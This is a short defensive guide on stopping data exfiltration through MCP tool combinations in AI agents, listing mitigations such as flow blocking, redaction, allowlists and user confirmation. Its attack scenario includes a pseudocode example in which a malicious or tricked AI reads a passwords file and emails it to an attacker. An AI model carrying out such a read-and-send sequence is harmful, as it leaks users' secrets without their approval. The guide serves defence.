# Preventing Data Exfiltration

Data exfiltration through MCP occurs when tool combinations are exploited to leak sensitive information to unauthorized parties.

## Attack Scenario

1. User asks AI to analyze a private document
2. AI reads the document via a filesystem tool
3. A malicious or tricked AI sends document content to an external service via another tool

```
read_file("/secrets/passwords.txt") → content in LLM context
send_email(to="attacker", body=content)  → data leaked
```

## Mitigation Strategies

### Tool Combination Analysis
Monitor and restrict dangerous tool combinations:
- **Read + Send** — Reading sensitive data then sending externally
- **Read + Write** — Copying data to accessible locations
- **Search + Exfiltrate** — Finding then extracting secrets

### Data Flow Controls

```
┌─────────────┐    Block    ┌─────────────┐
│ Read Tools  │──────✕─────►│ Send Tools  │
│ (filesystem,│             │ (email,     │
│  database)  │             │  slack, api)│
└─────────────┘             └─────────────┘
```

### Content Filtering
- Detect sensitive patterns (API keys, passwords, SSNs)
- Redact sensitive content before passing to outbound tools
- Alert users when sensitive data appears in tool arguments

### Per-Server Isolation
- Don't share data between different server sessions
- Each server sees only its own tool results
- The host controls what context the LLM receives

## Client-Side Controls

1. **Allowlists** — Only permit specific tool sequences
2. **Rate limiting** — Limit data transfer volume
3. **Audit logging** — Record all data access
4. **User confirmation** — Require approval for outbound actions
5. **Scope limiting** — Restrict what files/data servers can access

## Key Principle

Never let automated systems send sensitive data externally without explicit user approval.
